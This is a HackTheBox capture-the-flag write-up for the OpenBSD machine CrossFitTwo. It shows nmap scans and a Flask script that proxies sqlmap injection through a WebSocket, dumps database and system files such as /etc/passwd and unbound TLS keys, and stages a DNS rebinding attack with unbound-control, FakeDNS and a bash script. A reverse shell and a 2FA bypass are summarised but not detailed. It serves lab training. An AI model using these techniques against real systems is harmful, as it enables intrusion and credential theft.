# CrossFitTwo - HackTheBox - Writeup
OpenBSD, 50 Base Points, Insane

## Machine

![‏‏CrossFitTwo.JPG](images/CrossFitTwo.JPG)

## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```80```, ```22``` and ```8953``` (Unbound DNS Server).

***<ins>User 1<ins>***: By enumerating port 80 we found javascript file called ```ws.min.js``` which contains code that communicate with WebSocket that located on [http://gym.crossfit.htb/ws](http://gym.crossfit.htb/ws), Next, We found that ```params``` key on that WebSocket message vulnerable to [SQL Injection](https://portswigger.net/web-security/sql-injection), Using ```sqlmap``` & ```flask``` web server we dump users from DB, Next, We saw that we have ```FILE``` permission on DB which allowed us to read files from server, using that, we read the file ```/etc/relayd.conf``` which tell us about new domain [crossfit-club.htb](http://crossfit-club.htb) and 	grabbing unbound secret keys, configuration files which will let us create DNS Entries on the box, using those configuration files we make [DNS rebinding attack](https://www.youtube.com/watch?v=y9-0lICNjOQ) by adding subdomain with ```TTL=2``` using [unbound-control](https://manpages.ubuntu.com/manpages/xenial/man8/unbound-control.8.html), Next we make [CSRF attack](https://portswigger.net/web-security/csrf) (using DNS rebinding attack) to communicate with another WebSocket (that located on [crossfit-club.htb](http://crossfit-club.htb)) which contains chat between users, By reading the messages between the users using CSRF attack we found the password of username ```David```. 

***<ins>User 2<ins>***: By running ```find``` to show files owned by our group (```sysadmins```) we found ```/opt/sysadmin``` directory that contains ```statbot.js``` file, According [Loading from node_modules folders](https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders) logic we can use library injection vulnerability to create file ```index.js``` on  ```/opt/sysadmin/node_modules``` directory with ```NodeJS``` reverse shell, Like that we got the user ```john```.
 
***<ins>Root<ins>***: By running again ```find``` to show files owned by a group (```staff```) we found file ```/usr/local/bin/log```, By reversing this file using [Ghidra](https://ghidra-sre.org/) / [cutter](https://cutter.re/) / [IDA](https://hex-rays.com/ida-free/) we see system call [unveil](https://man.openbsd.org/unveil.2) which can set permissions at other points in the filesystem hierarchy, This function called as ```unevil("/var","r")``` meaning that we have read permission to all files on ```/var``` using ```/usr/local/bin/log``` binary, Using that we reading ```/etc/changelist``` and find that ```/root/.ssh/authorized_keys``` file backed up to ```/var/backups```, Using the root SSH private key - SSH is still asking for a password, By reading ```/etc/login.conf``` we found that the system have 2FA using [yubikey OpenBSD](https://www.straybits.org/post/2014/openbsd-yubikey/), Reading ```yubikey``` relevant files on ```/var/db/yubikey``` (using ```/usr/local/bin/log``` binary) allowed us to generate new token which use as password of root SSH.


## CrossFitTwo Solution

![pwn.JPG](images/pwn.JPG)


### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ nmap -p- -sC -sV -oA nmap/CrossFitTwo 10.10.10.232
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-08 16:16 IDT
WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
Nmap scan report for 10.10.10.232
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
80/tcp open  http    (PHP 7.4.12)
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Connection: close
|     Content-type: text/html; charset=UTF-8
|     Date: Sun, 08 Aug 2021 13:21:08 GMT
|     Server: OpenBSD httpd
|     X-Powered-By: PHP/7.4.12
|     <!DOCTYPE html>
|     <html lang="zxx">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="description" content="Yoga StudioCrossFit">
|     <meta name="keywords" content="Yoga, unica, creative, html">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta http-equiv="X-UA-Compatible" content="ie=edge">
|     <title>CrossFit</title>
|     <!-- Google Font -->
|     <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap" rel="stylesheet">
|     <link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap" rel="stylesheet">
|     <!-- Css Styles -->
|     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
|     <link rel="styleshe
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Connection: close
|     Content-type: text/html; charset=UTF-8
|     Date: Sun, 08 Aug 2021 13:21:09 GMT
|     Server: OpenBSD httpd
|     X-Powered-By: PHP/7.4.12
|     <!DOCTYPE html>
|     <html lang="zxx">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="description" content="Yoga StudioCrossFit">
|     <meta name="keywords" content="Yoga, unica, creative, html">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta http-equiv="X-UA-Compatible" content="ie=edge">
|     <title>CrossFit</title>
|     <!-- Google Font -->
|     <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap" rel="stylesheet">
|     <link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap" rel="stylesheet">
|     <!-- Css Styles -->
|     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
|_    <link rel="styleshe
|_http-server-header: OpenBSD httpd
|_http-title: CrossFit
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
8953/tcp open  ssl/ub-dns-control?
| ssl-cert: Subject: commonName=unbound
| Not valid before: 2021-01-11T07:01:10
|_Not valid after:  2040-09-28T07:01:10

 
```

UDP port scan:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ nmap -sU 10.10.10.232
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-09 03:41 IDT
Nmap scan report for crossfit.htb (10.10.10.232)
Host is up (0.091s latency).
Not shown: 999 closed ports
PORT     STATE         SERVICE
4500/udp open|filtered nat-t-ike

```
By observing port 80 [http://10.10.10.232/](http://10.10.10.232/):

![port80.JPG](images/port80.JPG)

We can see on that page domain ```crossfit.htb```, And by clicking on "Member Area" (Top left) we got the following domain ```employees.crossfit.htb```, Let's add those domains to ```/etc/hosts```.

By browsing to [http://employees.crossfit.htb/](http://employees.crossfit.htb/) we got the following login page:

![login.JPG](images/login.JPG)

By looking on site-map we found the following javascript file [http://10.10.10.232/js/ws.min.js](http://10.10.10.232/js/ws.min.js) ([ws.min.js](scripts/ws.min.js)):
```js
function updateScroll() {
    var e = document.getElementById("chats");
    e.scrollTop = e.scrollHeight
}
var token, ws = new WebSocket("ws://gym.crossfit.htb/ws/"),
    pingTimeout = setTimeout(() => {
        ws.close(), $(".chat-main").remove()
    }, 31e3);

function check_availability(e) {
    var s = new Object;
    s.message = "available", s.params = String(e), s.token = token, ws.send(JSON.stringify(s))
}
$(".chat-content").slideUp(), $(".hide-chat-box").click(function() {
    $(".chat-content").slideUp()
}), $(".show-chat-box").click(function() {
    $(".chat-content").slideDown(), updateScroll()
}), $(".close-chat-box").click(function() {
    $(".chat-main").remove()
}), ws.onopen = function() {}, ws.onmessage = function(e) {
    "ping" === e.data ? (ws.send("pong"), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith("Hello!") && $("#ws").show(), token = response.token, $("#chat-messages").append('<li class="receive-msg float-left mb-2"><div class="receive-msg-desc float-left ml-2"><p class="msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded">' + answer + "</p></div></li>"), updateScroll())
}, $("#sendmsg").on("keypress", function(e) {
    if (13 === e.which) {
        $(this).attr("disabled", "disabled");
        var s = $("#sendmsg").val();
        if ("" !== s) {
            $("#chat-messages").append('<li class="send-msg float-right mb-2"><p class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded">' + s + "</p></li>");
            var t = new Object;
            t.message = s, t.token = token, ws.send(JSON.stringify(t)), $("#sendmsg").val(""), $(this).removeAttr("disabled"), updateScroll()
        }
    }
});
```

We can see communicate with ```gym.crossfit.htb``` WebSocket.

Let's use [BurpSuite Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater/using) to communicate with this WebSocket:

![ws_hello.JPG](images/ws_hello.JPG)

As we can see the response message is:
 ```json
 {"status":"200","message":"Hello! This is Arnold, your assistant. Type 'help' to see available commands.","token":"3040595dac6ba07a4216eb5f13886a7fa20d11e69bd006dd9352fb36fd9ccc64"}
 ```

Let's send the message ```help``` by the following json:
```json
{"message":"help","token":"3040595dac6ba07a4216eb5f13886a7fa20d11e69bd006dd9352fb36fd9ccc64"}
```

And we got as response: 
```json
{"status":"200","message":"Available commands:<br>- coaches<br>- classes<br>- memberships","token":"cfac77dedce5c90db70793d8712b13fe92fab395c7c6c17378b97f33618bf22e"}
```

Let's try all of them, First ```coaches```:
```json
{"message":"coaches","token":"cfac77dedce5c90db70793d8712b13fe92fab395c7c6c17378b97f33618bf22e"}
```

Response:
```json
{"status":"200","message":"Meet our amazing coaches!<br><br><img height=40 src='/img/team/member-1.jpg' class='thumbnail'></img> Will Smith<br><code>2017 World CrossFit Champion</code><br><br><img height=40 src='/img/team/member-2.jpg' class='thumbnail'></img> Maria Williams<br><code>2018 Fitness Guru of the year</code><br><br><img height=40 src='/img/team/member-3.jpg' class='thumbnail'></img> Jack Parker<br><code>2019 IronMan Champion</code><br><br>","token":"f7936c5485980c0a9ac0f29e7929f6e3c602e867de394b51a05b2a8e2f282a0a"}
```

Next, ```classes```:
```json
{"message":"classes","token":"f7936c5485980c0a9ac0f29e7929f6e3c602e867de394b51a05b2a8e2f282a0a"}
```

Response: 
```json
{"status":"200","message":"Come see us and try one of our available classes for free! Our selection of amazing activities includes:<br><br>- CrossFit (Level 1 and 2)<br>- Fitness (Body and Mind)<br>- Climbing (Bouldering and Free)<br>- Cardio (Marathon training)<br>- Stretching (Isometric)<br>- Weight Lifting (Body Building, Power Lifting)<br>- Yoga (Power, Hatha, Kundalini)<br>- Nutrition (Customized meal plans)<br>- TRX (Suspension training)<br>","token":"1faac4694288ba360e8ea02e73a8e445fde0c338a99c059113f82df6bc181b1f"}
```

And last one ```memberships```:
```json
{"message":"memberships","token":"1faac4694288ba360e8ea02e73a8e445fde0c338a99c059113f82df6bc181b1f"}
```

Response: 
```json
{"status":"200","message":"Check the availability of our membership plans with a simple click!<br><br><b>1-month ($99.99)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(1)>Availability</button><br><br><b>3-months ($129.99)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(2)>Availability</button><br><br><b>6-months ($189.99 <del>$209.99</del>)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(3)>Availability</button><br><br><b>1-year ($859.99 <del>$899.99</del>)<b><br><button class='btn btn-sm btn-secondary' onclick=check_availability(4)>Availability</button><br><br>","token":"48abc1184bfe88bc2e3e9cf3e4f8476ea45aaa895edd4b59e4660591577f69ed"}
```

By looking on the javascript above ([ws.min.js](scripts/ws.min.js)) we can see the following fucntion:
```javascript
function check_availability(e) {
    var s = new Object;
    s.message = "available", s.params = String(e), s.token = token, ws.send(JSON.stringify(s))
}
```

Meaning hat we have another key called ```params``` where ```message``` equals to ```available```, Let's try it:
```json
{"message":"available","params":"1","token":"a68b0fc001510f6f662e7616802ebf6ac79463cad769fc6119d71758d30c0029"}
```

And the response is: 
```json
{"status":"200","message":"Good news! This membership plan is available.","token":"f9f91016061754507be86c518dbe9c0973201e7219169cbfa370dc32b1e7f3ea","debug":"[id: 1, name: 1-month]"}
```

Let's try SQL Injection against ```params``` key using ```sqlmap```, To do that, We can run [Flask](https://flask.palletsprojects.com/en/2.0.x/) web server which received ```sqlmap``` payload and send it using the WebSocket ([inject_server.py](scripts/inject_server.py)):
```python
from flask import Flask
from flask import request
import json
from websocket import create_connection

app = Flask(__name__)


@app.route('/inject')
def index():
    ws = create_connection("ws://gym.crossfit.htb/ws")
    result =  ws.recv()
    token=json.loads(result)['token']
    param=request.args.get('param')
    current_json=json.loads('{"message":"available","params":"1","token":"be8fa1cae3cd4a2b5c9ed815d4b151392e23fadc9ea1c9a44cf5534a7f582415"}')
    current_json['params']=param
    current_json['token']=token
    ws.send(json.dumps(current_json))
    result = json.loads(ws.recv())
    print (result['debug'])
    token=result['token']

    return result

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
```

Run it:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ python3 inject_server.py
 * Serving Flask app "server" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
```

And by running ```sqlmap``` we get:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ sqlmap -u http://localhost:5000/inject?param=1  --dump-all
...
Database: information_schema                                                                                                                                                                 
Table: ALL_PLUGINS
[106 entries]
+-------------------------------+
| PLUGIN_NAME                   |
+-------------------------------+
| ARCHIVE                       |
| Aria                          |
| AUDIT_NULL                    |
| auth_0x0100                   |
| binlog                        |
| BLACKHOLE                     |
| cleartext_plugin_server       |
| CLIENT_STATISTICS             |
| CSV                           |
| daemon_example                |
| debug_key_management          |
| ed25519                       |
| EXAMPLE                       |
| example_key_management        |
| FEDERATED                     |
| FEDERATED                     |
| FEEDBACK                      |
| file_key_management           |
| GEOMETRY_COLUMNS              |
| handlersocket                 |
| INDEX_STATISTICS              |
| inet6                         |
| inet6_aton                    |
| inet6_ntoa                    |
| inet_aton                     |
| inet_ntoa                     |
| InnoDB                        |
| INNODB_BUFFER_PAGE            |
| INNODB_BUFFER_PAGE_LRU        |
| INNODB_BUFFER_POOL_STATS      |
| INNODB_CMP                    |
| INNODB_CMPMEM                 |
| INNODB_CMPMEM_RESET           |
| INNODB_CMP_PER_INDEX          |
| INNODB_CMP_PER_INDEX_RESET    |
| INNODB_CMP_RESET              |
| INNODB_FT_BEING_DELETED       |
| INNODB_FT_CONFIG              |
| INNODB_FT_DEFAULT_STOPWORD    |
| INNODB_FT_DELETED             |
| INNODB_FT_INDEX_CACHE         |
| INNODB_FT_INDEX_TABLE         |
| INNODB_LOCKS                  |
| INNODB_LOCK_WAITS             |
| INNODB_METRICS                |
| INNODB_MUTEXES                |
| INNODB_SYS_COLUMNS            |
| INNODB_SYS_DATAFILES          |
| INNODB_SYS_FIELDS             |
| INNODB_SYS_FOREIGN            |
| INNODB_SYS_FOREIGN_COLS       |
| INNODB_SYS_INDEXES            |
| INNODB_SYS_SEMAPHORE_WAITS    |
| INNODB_SYS_TABLES             |
| INNODB_SYS_TABLESPACES        |
| INNODB_SYS_TABLESTATS         |
| INNODB_SYS_VIRTUAL            |
| INNODB_TABLESPACES_ENCRYPTION |
| INNODB_TRX                    |
| is_ipv4                       |
| is_ipv4_compat                |
| is_ipv4_mapped                |
| is_ipv6                       |
| LOCALES                       |
| MEMORY                        |
| METADATA_LOCK_INFO            |
| MRG_MyISAM                    |
| MyISAM                        |
| MYSQL_JSON                    |
| mysql_native_password         |
| mysql_old_password            |
| partition                     |
| PERFORMANCE_SCHEMA            |
| qa_auth_interface             |
| qa_auth_server                |
| QUERY_CACHE_INFO              |
| QUERY_RESPONSE_TIME           |
| QUERY_RESPONSE_TIME_AUDIT     |
| S3                            |
| SEQUENCE                      |
| SERVER_AUDIT                  |
| simple_parser                 |
| simple_password_check         |
| SPATIAL_REF_SYS               |
| SPHINX                        |
| SPIDER                        |
| SPIDER_ALLOC_MEM              |
| SPIDER_WRAPPER_PROTOCOLS      |
| SQL_ERROR_LOG                 |
| SQL_SEQUENCE                  |
| TABLE_STATISTICS              |
| test_plugin_server            |
| TEST_SQL_DISCOVERY            |
| THREAD_POOL_GROUPS            |
| THREAD_POOL_QUEUES            |
| THREAD_POOL_STATS             |
| THREAD_POOL_WAITS             |
| three_attempts                |
| two_questions                 |
| unix_socket                   |
| UNUSABLE                      |
| USER_STATISTICS               |
| user_variables                |
| wsrep                         |
| WSREP_MEMBERSHIP              |
| WSREP_STATUS                  |
+-------------------------------+
```

By enumerating the DB we found another table, ```employees```, Let's dump data from this table:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $sqlmap -u http://localhost:5000/inject?param=1  --dump -D employees -T employees

Database: employees                                                                                                                                                                 
Table: employees
[4 entries]
+-------------------------------+
|  email                         |
+-------------------------------+
|  david.palmer@crossfit.htb    |
|  will.smith@crossfit.htb      |
|  jack.parker@crossfit.htb     |
|  maria.williams@crossfit.htb	|
+-------------------------------+
```

Let's check if we have privileges:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ sqlmap -u http://localhost:5000/inject?param=1 --privileges
...
[03:35:15] [INFO] fetching database users privileges
database management system users privileges:
[*] 'crossfit_user'@'localhost' [1]:
    privilege: FILE

```

Great, We have privilege to read files.

Let's try to read ```/etc/passwd```:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ sqlmap -u http://localhost:5000/inject?param=1 --file-read=/var/www/html/index.php --batch
...
[03:37:55] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[03:37:55] [INFO] the local file '/home/evyatar/.local/share/sqlmap/output/localhost/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (3949 B)
files saved to [1]:
[*] /home/evyatar/.local/share/sqlmap/output/localhost/files/_etc_passwd (same file)

┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ cat /home/evyatar/.local/share/sqlmap/output/localhost/files/_etc_passwd
root:*:0:0:Charlie &:/root:/bin/ksh
daemon:*:1:1:The devil himself:/root:/sbin/nologin
operator:*:2:5:System &:/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
build:*:21:21:base and xenocara build:/var/empty:/bin/ksh
sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
_portmap:*:28:28:portmap:/var/empty:/sbin/nologin
_identd:*:29:29:identd:/var/empty:/sbin/nologin
_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin
_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin
_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin
_x11:*:35:35:X Server:/var/empty:/sbin/nologin
_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin
_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin
_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin
_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin
_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin
_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin
_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin
_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin
_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin
_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin
_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin
www:*:67:67:HTTP Server:/var/www:/sbin/nologin
_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin
_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin
_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin
_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin
_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin
_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin
_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin
_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin
_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin
_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin
_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin
_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin
_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin
_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin
_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin
_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin
_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin
_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin
_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin
_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin
_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin
_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin
_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin
_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin
_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin
_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin
_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin
_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin
_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin
_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin
_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin
_file:*:104:104:file privsep:/var/empty:/sbin/nologin
_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin
_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin
_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin
_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin
_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin
_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin
_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin
lucille:*:1002:1002:,,,:/home/lucille:/bin/csh
node:*:1003:1003::/home/node:/bin/ksh
_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin
_redis:*:686:686:redis account:/var/redis:/sbin/nologin
david:*:1004:1004:,,,:/home/david:/bin/csh
john:*:1005:1005::/home/john:/bin/csh
ftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin
```

From ```nmap``` scan we found port 8953 which is [unbound_dns](https://calomel.org/unbound_dns.html), The configuration file of this service located on ```/usr/local/etc/unbound/unbound.conf```, Let's try to read it:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ sqlmap -u http://localhost:5000/inject?param=1 --file-read=/var/unbound/etc/unbound.conf --batch
...
[16:31:43] [INFO] fetching file: '/var/unbound/etc/unbound.conf'
do you want confirmation that the remote file '/var/unbound/etc/unbound.conf' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[16:31:44] [INFO] the local file '/home/evyatar/.local/share/sqlmap/output/localhost/files/_var_unbound_etc_unbound.conf' and the remote file '/var/unbound/etc/unbound.conf' have the same size (777 B)
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo]
└──╼ $ cat /home/evyatar/.local/share/sqlmap/output/localhost/files/_var_unbound_etc_unbound.conf
server:
    interface: 127.0.0.1
    interface: ::1
    access-control: 0.0.0.0/0 refuse
    access-control: 127.0.0.0/8 allow
    access-control: ::0/0 refuse
    access-control: ::1 allow
    hide-identity: yes
    hide-version: yes
    msg-cache-size: 0
    rrset-cache-size: 0
    cache-max-ttl: 0
    cache-max-negative-ttl: 0    
    auto-trust-anchor-file: "/var/unbound/db/root.key"
    val-log-level: 2
    aggressive-nsec: yes
    include: "/var/unbound/etc/conf.d/local_zones.conf"

remote-control:
    control-enable: yes
    control-interface: 0.0.0.0
    control-use-cert: yes
    server-key-file: "/var/unbound/etc/tls/unbound_server.key"
    server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"
    control-key-file: "/var/unbound/etc/tls/unbound_control.key"
    control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
``` 

Let's get all certificates files ```/var/unbound/etc/tls/unbound_server.key```, ```/var/unbound/etc/tls/unbound_server.pem```, ```/var/unbound/etc/tls/unbound_control.key```,```/var/unbound/etc/tls/unbound_control.pem``` and put them on ```/hackthebox/CrossFitTwo/unbound_files```.

Let's change ```unbound.conf``` file to the following:
```console
remote-control:
    control-enable: yes
    control-interface: 0.0.0.0
    control-use-cert: yes
    server-key-file: "/hackthebox/CrossFitTwo/unbound_files/unbound_server.key"
    server-cert-file: "/hackthebox/CrossFitTwo/unbound_files/unbound_server.pem"
    control-key-file: "/hackthebox/CrossFitTwo/unbound_files/unbound_control.key"
    control-cert-file: "/hackthebox/CrossFitTwo/unbound_files/unbound_control.pem"
```

```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ ls
unbound.conf  unbound_control.key  unbound_control.pem  unbound_server.pem
```

Let's read also the file ```/etc/relayd.conf``` which is relay daemon configuration file:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ cat relayd.conf
table<1>{127.0.0.1}
table<2>{127.0.0.1}
table<3>{127.0.0.1}
table<4>{127.0.0.1}
http protocol web{
	pass request quick header "Host" value "*crossfit-club.htb" forward to <3>
	pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>
	match request path "/*" forward to <1>
	match request path "/ws*" forward to <4>
	http websockets
}

table<5>{127.0.0.1}
table<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
http protocol portal{
	pass request quick path "/" forward to <5>
	pass request quick path "/index.html" forward to <5>
	pass request quick path "/home" forward to <5>
	pass request quick path "/login" forward to <5>
	pass request quick path "/chat" forward to <5>
	pass request quick path "/js/*" forward to <5>
	pass request quick path "/css/*" forward to <5>
	pass request quick path "/fonts/*" forward to <5>
	pass request quick path "/images/*" forward to <5>
	pass request quick path "/favicon.ico" forward to <5>
	pass forward to <6>
	http websockets
}

relay web{
	listen on "0.0.0.0" port 80
	protocol web
	forward to <1> port 8000
	forward to <2> port 8001
	forward to <3> port 9999
	forward to <4> port 4419
}

relay portal{
	listen on 127.0.0.1 port 9999
	protocol portal
	forward to <5> port 8002
	forward to <6> port 5000 mode source-hash
}

```

Now, To communicate with unbound server we need to use [unbound-control](https://manpages.ubuntu.com/manpages/xenial/man8/unbound-control.8.html) as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ unbound-control -c unbound.conf -s 10.10.10.232 status
version: 1.11.0
verbosity: 1
threads: 1
modules: 2 [ validator iterator ]
uptime: 528 seconds
options: control(ssl)
unbound (pid 71735) is running...
```

**DNS rebinding attack:**

So if we have access to unbound service we can make DNS rebinding attack, **I really recommend to see the following video from DEF CON 27 Conference [https://www.youtube.com/watch?v=y9-0lICNjOQ](https://www.youtube.com/watch?v=y9-0lICNjOQ) to understand how DNS rebinding attack works!**

So, first we need to use ```unbound-control``` to add a fake subdomain, pointing back to our local machine.

Next, We need to run [FakeDNS](https://github.com/Crypt0s/FakeDns) (Or [dnschef](https://github.com/iphelix/dnschef)) to catch the request from the box, and point it to our host, create a listener to see what it is doing.

Let's add fake subdomain using ```unbound-control```:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ unbound-control -c unbound.conf -s 10.10.10.232@8953 forward_add +i xemployees.crossfit.htb. 10.10.14.14@9953
```

So we use the ```unbound.conf``` like before, the server is ```10.10.10.232@8953``` where 8953 is unbound port listener, Add fake subdomain ```xemployees.crossfit.htb``` (We can use any prefix according ```pass request quick header "Host" value "*employees.crossfit.htb" forward to <2>``` from ```relayd.conf```) and point it to our host on port 9953.

Run ```FakeDNS``` with the following configuration:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ cat FakeDns/dns.conf
A xemployees.crossfit.htb.* 127.0.0.1 2%10.10.14.14
```

Means that  ```A``` record for ```xemployees.crossfit.htb.``` which evaluates to 127.0.0.1 for the first 2 tries
On the 3th request from a client which has already made 2 requests, FakeDNS starts serving out the second ip ```10.10.14.14``` which is our host.
We need to add ```xemployees.crossfit.htb``` to ```/etc/hosts```.

To trigger that we need to send ```Forget password``` request with ```david.palmer@crossfit.htb``` user on the page:

![login.JPG](images/login.JPG)

So let's write bash script to do all of this [dns_rebind.sh](scripts/dns_rebind.sh):
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ cat dns_rebind.sh
#!/bin/bash
unbound-control -c unbound.conf -s 10.10.10.232@8953 forward_add +i xemployees.crossfit.htb. 10.10.14.14@9953

python3 fakedns.py -c dns.conf -p 9953 --rebind &

sleep 3
echo "FakeDNS is running..."
curl http://xemployees.crossfit.htb/password-reset.php -XPOST -d 'email=david.palmer@crossfit.htb' | grep alert

while :
do
	sleep 1
done
```

Because we actually change the ip address to our host - we need also to listen to port 80 to get the requests:
```console
┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/unbound_files]
└──╼ $ sudo php -S 0.0.0.0:80
[sudo] password for user: 
[Sun Aug 15 03:28:02 2021] PHP 7.4.5 Development Server (http://0.0.0.0:80) started

```

Run the ```dns_rebind.sh``` script and when the attack success we will get the following:
```console
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.232 - - [13/Aug/2021 17:45:18] code 404, message File not found
